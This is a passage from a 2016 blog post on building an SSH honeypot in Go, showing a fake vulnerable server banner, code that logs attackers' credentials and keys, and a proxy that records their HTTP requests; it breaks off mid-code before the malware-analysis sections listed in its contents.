<!DOCTYPE html>
<html>

<head>
<meta charset="utf-8" />
<meta name="author" content="" />
<meta name="description" content="" />
<meta name="keywords" content="" />
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
<meta name="generator" content="Hugo 0.25.1" />

<meta property="og:title" content="Building honeypots and analyzing linux malware" />
<meta property="og:description" content="I’ve been running https://sshpot.com/ for a while now - and decided it needed to be revamped and overhauled - and thought I’d make a presentation and write up some details on the process as well. If you&rsquo;d like to just view the slides, hop over here.
If you&rsquo;re just looking for the source code:
 Web application  https://github.com/joshrendek/ssh-passwd-honeypot  Honeypot Server  https://github.com/joshrendek/sshpot-com   Table of Contents  Design Goals  Appearing More Vulnerable Correlating Sessions &amp; Commands Proxying Requests &amp; Capturing Data  Handling Requests Simulating Commands Persistence Layer Analyzing Dropped Files  Trojan-DDoS." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://joshrendek.com/2016/06/building-honeypots-and-analyzing-linux-malware/" />



<meta property="article:published_time" content="2016-06-30T21:53:08&#43;00:00"/>
<meta property="article:modified_time" content="2016-06-30T21:53:08&#43;00:00"/>













  <meta name="twitter:card" content="summary"/>



<meta name="twitter:text:title" content="Building honeypots and analyzing linux malware"/>
<meta name="twitter:title" content="Building honeypots and analyzing linux malware"/>
<meta name="twitter:description" content="I’ve been running https://sshpot.com/ for a while now - and decided it needed to be revamped and overhauled - and thought I’d make a presentation and write up some details on the process as well. If you&rsquo;d like to just view the slides, hop over here.
If you&rsquo;re just looking for the source code:
 Web application  https://github.com/joshrendek/ssh-passwd-honeypot  Honeypot Server  https://github.com/joshrendek/sshpot-com   Table of Contents  Design Goals  Appearing More Vulnerable Correlating Sessions &amp; Commands Proxying Requests &amp; Capturing Data  Handling Requests Simulating Commands Persistence Layer Analyzing Dropped Files  Trojan-DDoS."/>




<meta itemprop="name" content="Building honeypots and analyzing linux malware">
<meta itemprop="description" content="I’ve been running https://sshpot.com/ for a while now - and decided it needed to be revamped and overhauled - and thought I’d make a presentation and write up some details on the process as well. If you&rsquo;d like to just view the slides, hop over here.
If you&rsquo;re just looking for the source code:
 Web application  https://github.com/joshrendek/ssh-passwd-honeypot  Honeypot Server  https://github.com/joshrendek/sshpot-com   Table of Contents  Design Goals  Appearing More Vulnerable Correlating Sessions &amp; Commands Proxying Requests &amp; Capturing Data  Handling Requests Simulating Commands Persistence Layer Analyzing Dropped Files  Trojan-DDoS.">


<meta itemprop="dateModified" content="2016-06-30T21:53:08&#43;00:00" />
<meta itemprop="wordCount" content="3903">



<meta itemprop="keywords" content="" />


<link rel="stylesheet" type="text/css" href="/css/layout.css" />
<link rel="stylesheet" type="text/css" href="/css/pygments.css" />
<link rel="stylesheet" type="text/css" href="/css/color-dark.css" />


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-3754808-1', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>


<title>


     Building honeypots and analyzing linux malware 

</title>

<script src="/js/highlight.min.js"></script>
<link rel="stylesheet" href="/css/tomorrow-night.min.css" />
<script>hljs.initHighlightingOnLoad();</script>

</head>


<body>
<div class="main">
<header>

<div class="header-bar">

  <nav>
    <div class="siteTitle">
      <a href="https://joshrendek.com">
        <span class='blue-brace'>{</span>
        Josh Rendek
        <span class='blue-brace'>}</span>
      </a>
      <div class="header-subtitle">
        <h2>
          <span class="heart">&lt;3</span> Ruby &amp; Go
        </h2>
      </div>
    </div> 
  </nav>
  <nav>
      
      
      <a class="nav-item" href="/"><div class="nav-item-title">Home</div></a>
      
      <a class="nav-item" href="/projects/"><div class="nav-item-title">Projects</div></a>
      
      <a class="nav-item" href="/archives/"><div class="nav-item-title">Archives</div></a>
      
      <a class="nav-item" href="https://devopsbyvideo.com/"><div class="nav-item-title">Screen Casts</div></a>
      
      <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
      
      <a class="nav-item" href="/categories/"><div class="nav-item-title">Categories</div></a>
      
      <a class="nav-item" href="https://github.com/joshrendek/"><div class="nav-item-title">GitHub</div></a>
      
      <a class="nav-item" href="/resume.pdf"><div class="nav-item-title">Resume</div></a>
      
   </nav>
</div>

  
<div class="social-links-header">

  

  

  

  

  

</div>


</header>


<main>
  <div class="articles">
    <article class="post">
      <div class="date"> Jun 30, 2016 - 19 minutes</div>
      <h1 class="title"> Building honeypots and analyzing linux malware </h1>
      <div class="content"> 

<p>I’ve been running <a href="https://sshpot.com/">https://sshpot.com/</a> for a while now - and decided it needed to be revamped and overhauled - and thought I’d make a presentation and write up some details on the process as well. If you&rsquo;d like to just view the slides, hop over <a href="https://docs.google.com/presentation/d/1rSrypB4_oarVGv-z5vRY6w_bgZ1DTzSexMWThyn1f2Q">here</a>.</p>

<p>If you&rsquo;re just looking for the source code:</p>

<ul>
<li>Web application

<ul>
<li><a href="https://github.com/joshrendek/ssh-passwd-honeypot">https://github.com/joshrendek/ssh-passwd-honeypot</a></li>
</ul></li>
<li>Honeypot Server

<ul>
<li><a href="https://github.com/joshrendek/sshpot-com">https://github.com/joshrendek/sshpot-com</a></li>
</ul></li>
</ul>

<h4 id="table-of-contents">Table of Contents</h4>

<ul>
<li><a href="#design-goals">Design Goals</a>

<ul>
<li><a href="#appearing-more-vulnerable">Appearing More Vulnerable</a></li>
<li><a href="#correlating-sessions">Correlating Sessions &amp; Commands</a></li>
<li><a href="#proxying-requests">Proxying Requests &amp; Capturing Data</a></li>
</ul></li>
<li><a href="#handling-requests">Handling Requests</a></li>
<li><a href="#simulating-commands">Simulating Commands</a></li>
<li><a href="#persistence-layer">Persistence Layer</a></li>
<li><a href="#analyzing-dropped-files">Analyzing Dropped Files</a>

<ul>
<li><a href="#trojan">Trojan-DDoS.Linux.Xarcen.a</a></li>
<li><a href="#ddos-flood">DDOS.Flood / DnsAmp</a></li>
</ul></li>
</ul>

<p><a name="design-goals"></a></p>

<h2 id="design-goals">Design goals</h2>

<p>I wanted to make sure this was an improvement over the previous iteration, so I laid out several goals for the rewrite:</p>

<ul>
<li>Appear more ‘vulnerable&rsquo;</li>
<li>Correlate commands/sessions (old version just logged data)</li>
<li>Proxy requests and capture data</li>
<li>Better statistics</li>
<li>Redesigned command simulation using interfaces instead of simple string matching</li>
</ul>

<p>Some important steps the honeypot must do:</p>

<ul>
<li>generate a new private key pair for the server on every boot (appear like a fresh server)</li>
<li>Advertise a vulnerable version - Check past CVE’s if you want to target a specific one. <strong>Important</strong> the banner must start with SSH-2.0 or the client won’t handshake</li>
<li>Must listen on port 22, so you should move the actual SSHD to port 2222 (or any other port, for example)</li>
<li>Do the SSH handshake</li>
<li>Handle requests</li>
</ul>

<p><a name="appearing-more-vulnerable"></a></p>

<h4 id="appearing-more-vulnerable">Appearing More Vulnerable</h4>

<p>We need to create an SSH config for the <code>ssh</code> package to use when constructing a new object. An important thing to note here is the <code>SSH-2.0</code> prefix to the <code>ServerVersion</code> - if that is missing the client will do weird things (including not connecting).</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno">1 </span><span class="nx">sshConfig</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">ServerConfig</span><span class="p">{</span>
<span class="lineno">2 </span>		<span class="nx">PasswordCallback</span><span class="p">:</span>  <span class="nx">passAuthCallback</span><span class="p">,</span>
<span class="lineno">3 </span>		<span class="nx">PublicKeyCallback</span><span class="p">:</span> <span class="nx">keyAuthCallback</span><span class="p">,</span>
<span class="lineno">4 </span>		<span class="nx">ServerVersion</span><span class="p">:</span>     <span class="s">&quot;SSH-2.0-OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013&quot;</span><span class="p">,</span> <span class="c1">// old and vulnerable!</span>
<span class="lineno">5 </span>	<span class="p">}</span>
</code></pre></div>


<p><a name="correlating-sessions"></a></p>

<h4 id="correlating-sessions-and-commands">Correlating Sessions and Commands</h4>

<p>In order to correlate requests we can use the permission extension in the ssh package to store a map of data - in our case, a simple GUID to keep state across requests. This could also be used to store a user id or some other type of session identifier, for instance, if you were trying to write your own replacement ssh daemon to do things like serving up git requests.</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno"> 1 </span><span class="kd">func</span> <span class="nx">passAuthCallback</span><span class="p">(</span><span class="nx">conn</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">ConnMetadata</span><span class="p">,</span> <span class="nx">password</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 2 </span>	<span class="nx">guid</span> <span class="o">:=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">NewV4</span><span class="p">()</span>
<span class="lineno"> 3 </span>	<span class="nx">ip</span><span class="p">,</span> <span class="nx">remotePort</span> <span class="o">:=</span> <span class="nx">parseIpPortFrom</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
<span class="lineno"> 4 </span>	<span class="nx">login</span> <span class="o">:=</span> <span class="nx">SshLogin</span><span class="p">{</span><span class="nx">RemoteAddr</span><span class="p">:</span> <span class="nx">ip</span><span class="p">,</span>
<span class="lineno"> 5 </span>		<span class="nx">RemotePort</span><span class="p">:</span> <span class="nx">remotePort</span><span class="p">,</span>
<span class="lineno"> 6 </span>		<span class="nx">Username</span><span class="p">:</span>   <span class="nx">conn</span><span class="p">.</span><span class="nx">User</span><span class="p">(),</span>
<span class="lineno"> 7 </span>		<span class="nx">Password</span><span class="p">:</span>   <span class="nb">string</span><span class="p">(</span><span class="nx">password</span><span class="p">),</span>
<span class="lineno"> 8 </span>		<span class="nx">Guid</span><span class="p">:</span>       <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">(),</span>
<span class="lineno"> 9 </span>		<span class="nx">Version</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">conn</span><span class="p">.</span><span class="nx">ClientVersion</span><span class="p">()),</span>
<span class="lineno">10 </span>		<span class="nx">LoginType</span><span class="p">:</span>  <span class="s">&quot;password&quot;</span><span class="p">,</span>
<span class="lineno">11 </span>	<span class="p">}</span>
<span class="lineno">12 </span>	<span class="nx">login</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
<span class="lineno">13 </span>	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">{</span><span class="nx">Extensions</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;guid&quot;</span><span class="p">:</span> <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">()}},</span> <span class="kc">nil</span>
<span class="lineno">14 </span><span class="p">}</span>
</code></pre></div>


<p>We want to capture as much metadata about the connection as possible, as well as capture public keys that are available when the attacker is using an ssh-agent - this can help us in the future to possibly identify bad actors. Here we marshal the public key and capture the key type being sent.</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno"> 1 </span><span class="kd">func</span> <span class="nx">keyAuthCallback</span><span class="p">(</span><span class="nx">conn</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">ConnMetadata</span><span class="p">,</span> <span class="nx">key</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">PublicKey</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 2 </span>	<span class="nx">guid</span> <span class="o">:=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">NewV4</span><span class="p">()</span>
<span class="lineno"> 3 </span>	<span class="nx">ip</span><span class="p">,</span> <span class="nx">remotePort</span> <span class="o">:=</span> <span class="nx">parseIpPortFrom</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
<span class="lineno"> 4 </span>	<span class="nx">login</span> <span class="o">:=</span> <span class="nx">SshLogin</span><span class="p">{</span><span class="nx">RemoteAddr</span><span class="p">:</span> <span class="nx">ip</span><span class="p">,</span>
<span class="lineno"> 5 </span>		<span class="nx">RemotePort</span><span class="p">:</span> <span class="nx">remotePort</span><span class="p">,</span>
<span class="lineno"> 6 </span>		<span class="nx">Username</span><span class="p">:</span>   <span class="nx">conn</span><span class="p">.</span><span class="nx">User</span><span class="p">(),</span>
<span class="lineno"> 7 </span>		<span class="nx">Guid</span><span class="p">:</span>       <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">(),</span>
<span class="lineno"> 8 </span>		<span class="nx">Version</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">conn</span><span class="p">.</span><span class="nx">ClientVersion</span><span class="p">()),</span>
<span class="lineno"> 9 </span>		<span class="nx">PublicKey</span><span class="p">:</span>  <span class="nx">key</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(),</span>
<span class="lineno">10 </span>		<span class="nx">KeyType</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">Type</span><span class="p">()),</span>
<span class="lineno">11 </span>		<span class="nx">LoginType</span><span class="p">:</span>  <span class="s">&quot;key&quot;</span><span class="p">,</span>
<span class="lineno">12 </span>	<span class="p">}</span>
<span class="lineno">13 </span>	<span class="k">go</span> <span class="nx">login</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
<span class="lineno">14 </span>	<span class="c1">//log.Println(&quot;Fail to authenticate&quot;, conn, &quot;:&quot;, err)</span>
<span class="lineno">15 </span>	<span class="c1">//return nil, errors.New(&quot;invalid authentication&quot;)</span>
<span class="lineno">16 </span>	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">{</span><span class="nx">Extensions</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;guid&quot;</span><span class="p">:</span> <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">()}},</span> <span class="kc">nil</span>
<span class="lineno">17 </span><span class="p">}</span>
</code></pre></div>


<p><a name="proxying-requests"></a></p>

<h4 id="proxying-requests-and-capturing-data">Proxying Requests and Capturing Data</h4>

<p>Now we can talk about proxying requests. I&rsquo;m going to throw some code at you then explain below:</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno"> 1 </span><span class="kd">func</span> <span class="nx">HandleTcpReading</span><span class="p">(</span><span class="nx">channel</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">Channel</span><span class="p">,</span> <span class="nx">term</span> <span class="o">*</span><span class="nx">terminal</span><span class="p">.</span><span class="nx">Terminal</span><span class="p">,</span> <span class="nx">perms</span> <span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 2 </span>	<span class="k">defer</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="lineno"> 3 </span>	<span class="k">for</span> <span class="p">{</span>
<span class="lineno"> 4 </span>		<span class="c1">// read up to 1MB of data</span>
<span class="lineno"> 5 </span>		<span class="nx">b</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
<span class="lineno"> 6 </span>		<span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">Read</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
<span class="lineno"> 7 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno"> 8 </span>			<span class="k">if</span> <span class="nx">err</span><span class="p">.</span><span class="nx">Error</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;EOF&quot;</span> <span class="p">{</span>
<span class="lineno"> 9 </span>				<span class="k">return</span>
<span class="lineno">10 </span>			<span class="p">}</span>
<span class="lineno">11 </span>		<span class="p">}</span>
<span class="lineno">12 </span>		<span class="nx">read</span> <span class="o">:=</span> <span class="nx">bufio</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nx">strings</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">b</span><span class="p">)))</span>
<span class="lineno">13 </span>		<span class="nx">toReq</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ReadRequest</span><span class="p">(</span><span class="nx">read</span><span class="p">)</span>
<span class="lineno">14 </span>		<span class="c1">// TODO: https will panic atm - not supported</span>
<span class="lineno">15 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno">16 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Error parsing request: &quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno">17 </span>			<span class="k">return</span>
<span class="lineno">18 </span>		<span class="p">}</span>
<span class="lineno">19 </span>		<span class="nx">err</span> <span class="p">=</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">ParseForm</span><span class="p">()</span>
<span class="lineno">20 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno">21 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Error parsing form: &quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno">22 </span>			<span class="k">return</span>
<span class="lineno">23 </span>		<span class="p">}</span>
<span class="lineno">24 </span>		<span class="nx">url</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%s%s&quot;</span><span class="p">,</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">URL</span><span class="p">)</span>
<span class="lineno">25 </span>
<span class="lineno">26 </span>		<span class="nx">httpReq</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">HttpRequest</span><span class="p">{</span>
<span class="lineno">27 </span>			<span class="nx">Headers</span><span class="p">:</span>  <span class="nx">toReq</span><span class="p">.</span><span class="nx">Header</span><span class="p">,</span>
<span class="lineno">28 </span>			<span class="nx">URL</span><span class="p">:</span>      <span class="nx">url</span><span class="p">,</span>
<span class="lineno">29 </span>			<span class="nx">FormData</span><span class="p">:</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">Form</span><span class="p">,</span>
<span class="lineno">30 </span>			<span class="nx">Method</span><span class="p">:</span>   <span class="nx">toReq</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span>
<span class="lineno">31 </span>			<span class="nx">Guid</span><span class="p">:</span>     <span class="nx">perms</span><span class="p">.</span><span class="nx">Extensions</span><span class="p">[</span><span class="s">&quot;guid&quot;</span><span class="p">],</span>
<span class="lineno">32 </span>			<span class="nx">Hostname</span><span class="p">:</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span>
<span class="lineno">33 </span>		<span class="p">}</span>
<span class="lineno">34 </span>
<span class="lineno">35 </span>		<span class="nx">client</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{}</span>
<span class="lineno">36 </span>		<span class="nx">resp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;http://%s&quot;</span><span class="p">,</span> <span class="nx">url</span><span class="p">))</span>
<span class="lineno">37 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno">38 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Fatalf</span><span class="p">(</span><span class="s">&quot;Body read error: %s&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno">39 </span>		<span class="p">}</span>
<span class="lineno">40 </span>
<span class="lineno">41 </span>		<span class="k">defer</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="lineno">42 </span>		<span class="nx">body</span><span class="p">,</span> <span class="nx">err2</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nx">ReadAll</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
<span class="lineno">43 </span>		<span class="k">if</span> <span class="nx">err2</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno">44 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Fatalf</span><span class="p">(</span><span class="s">&quot;Body read error: %s&quot;</span><span class="p">,</span> <span class="nx">err2</span><span class="p">)</span>
<span class="lineno">45 </span>		<span class="p">}</span>
<span class="lineno">46 </span>		<span class="nx">httpReq</span><span class="p">.</span><span class="nx">Response</span> <span class="p">=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
<span class="lineno">47 </span>		<span class="nx">httpReq</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
<span class="lineno">48 </span>
<span class="lineno">49 </span>		<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;[ http://%s ] %s&quot;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span>
<span class="lineno">50 </span>
<span class="lineno">51 </span>		<span class="nx">channel</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
<span class="lineno">52 </span>		<span class="c1">// make the http request</span>
<span class="lineno">53 </span>
<span class="lineno">54 </span>		<span class="c1">//if resp, ok := httpHandler[url]; ok {</span>
<span class="lineno">55 </span>		<span class="c1">//	channel.Write(resp)</span>
<span class="lineno">56 </span>		<span class="c1">//} else {</span>
<span class="lineno">57 </span>		<span class="c1">//	channel.Write([]byte(&quot;45.4.5.6&quot;))</span>
<span class="lineno">58 </span>		<span class="c1">//}</span>
<span class="lineno">59 </span>		<span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="lineno">60 </span>	<span class="p">}</span>
<span class="lineno">61 </span><span class="p">}</span>
</code></pre></div>


<p>On line 5 we&rsquo;re going to read directly from the TCP connection, and only up to 1MB of data - if we get an EOF we&rsquo;ll return. Next on line <sup>12</sup>&frasl;<sub>13</sub> we&rsquo;re using a nice part of the http package that lets us take a raw stream of TCP bytes and convert it to the appropriate HTTP request that its asking for (like <code>GET /foobar</code>) and handling all the other headers/post params.</p>

<p>After getting the TCP request into something we can work with more easily, we parse out any form params on line 19, and then we reconstruct the url to visit on line 24.</p>

<p>Line 26 is using our persistence struct to save everything that has come in so far.</p>

<p>Line 25 and line 54 can be interchanged. For my honeypots I&rsquo;m actually making the raw requests that they&rsquo;re asking for (only <code>GET</code>s) - the other option is using the <code>httpHandler</code> struct and create dummy responses for various websites. After we make the raw request we store the response in our persistence struct and save it to the API on line <sup>46</sup>&frasl;<sub>47</sub>.</p>

<p>Finally on line 59 we close the channel to tell the client that data has been returned and is done.</p>

<p><a name="handling-requests"></a></p>

<h2 id="handling-requests">Handling requests</h2>

<p>The biggest portion of handling requests is accepting them and sending them off to be handled by the channel handler - which will be incoming commands and tcp connections. We loop to handle connections and perform the handshake for each new request.</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno"> 1 </span><span class="k">for</span> <span class="p">{</span>
<span class="lineno"> 2 </span>		<span class="nx">tcpConn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">listener</span><span class="p">.</span><span class="nx">Accept</span><span class="p">()</span>
<span class="lineno"> 3 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno"> 4 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;failed to accept incoming connection (%s)&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno"> 5 </span>			<span class="k">continue</span>
<span class="lineno"> 6 </span>		<span class="p">}</span>
<span class="lineno"> 7 </span>		<span class="c1">// Before use, a handshake must be performed on the incoming net.Conn.</span>
<span class="lineno"> 8 </span>		<span class="nx">sshConn</span><span class="p">,</span> <span class="nx">chans</span><span class="p">,</span> <span class="nx">reqs</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">NewServerConn</span><span class="p">(</span><span class="nx">tcpConn</span><span class="p">,</span> <span class="nx">sshConfig</span><span class="p">)</span>
<span class="lineno"> 9 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno">10 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;failed to handshake (%s)&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno">11 </span>			<span class="k">continue</span>
<span class="lineno">12 </span>		<span class="p">}</span>
<span class="lineno">13 </span>
<span class="lineno">14 </span>		<span class="c1">// Check remote address</span>
<span class="lineno">15 </span>		<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;new ssh connection from %s (%s)&quot;</span><span class="p">,</span> <span class="nx">sshConn</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">(),</span> <span class="nx">sshConn</span><span class="p">.</span><span class="nx">ClientVersion</span><span class="p">())</span>
<span class="lineno">16 </span>
<span class="lineno">17 </span>		<span class="c1">// Print incoming out-of-band Requests</span>
<span class="lineno">18 </span>		<span class="k">go</span> <span class="nx">handleRequests</span><span class="p">(</span><span class="nx">reqs</span><span class="p">)</span>
<span class="lineno">19 </span>		<span class="c1">// Accept all channels</span>
<span class="lineno">20 </span>		<span class="k">go</span> <span class="nx">handleChannels</span><span class="p">(</span><span class="nx">chans</span><span class="p">,</span> <span class="nx">sshConn</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">)</span>
<span class="lineno">21 </span>	<span class="p">}</span>
</code></pre></div>


<p>On line 18 we just log out of band requests that aren&rsquo;t what we want. Line 20 handles the meat and potatoes of our programs which is incoming commands and SOCKS proxy requests. We do both of these in go routines so multiple clients can connect at once.</p>

<p>The next important step is handling both out of band requests and incoming TPC connections - jump to the end of the codelbock for an explanation.</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno">  1 </span><span class="kd">func</span> <span class="nx">handleChannels</span><span class="p">(</span><span class="nx">chans</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">NewChannel</span><span class="p">,</span> <span class="nx">perms</span> <span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  2 </span>	<span class="c1">// Service the incoming Channel channel.</span>
<span class="lineno">  3 </span>	<span class="k">for</span> <span class="nx">newChannel</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">chans</span> <span class="p">{</span>
<span class="lineno">  4 </span>		<span class="nx">channel</span><span class="p">,</span> <span class="nx">requests</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">newChannel</span><span class="p">.</span><span class="nx">Accept</span><span class="p">()</span>
<span class="lineno">  5 </span>		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno">  6 </span>			<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;could not accept channel (%s)&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno">  7 </span>			<span class="k">continue</span>
<span class="lineno">  8 </span>		<span class="p">}</span>
<span class="lineno">  9 </span>
<span class="lineno"> 10 </span>		<span class="kd">var</span> <span class="nx">shell</span> <span class="kt">string</span>
<span class="lineno"> 11 </span>		<span class="nx">shell</span> <span class="p">=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Getenv</span><span class="p">(</span><span class="s">&quot;SHELL&quot;</span><span class="p">)</span>
<span class="lineno"> 12 </span>		<span class="k">if</span> <span class="nx">shell</span> <span class="o">==</span> <span class="s">&quot;&quot;</span> <span class="p">{</span>
<span class="lineno"> 13 </span>			<span class="nx">shell</span> <span class="p">=</span> <span class="nx">DEFAULT_SHELL</span>
<span class="lineno"> 14 </span>		<span class="p">}</span>
<span class="lineno"> 15 </span>
<span class="lineno"> 16 </span>		<span class="k">if</span> <span class="nx">newChannel</span><span class="p">.</span><span class="nx">ChannelType</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;direct-tcpip&quot;</span> <span class="p">{</span>
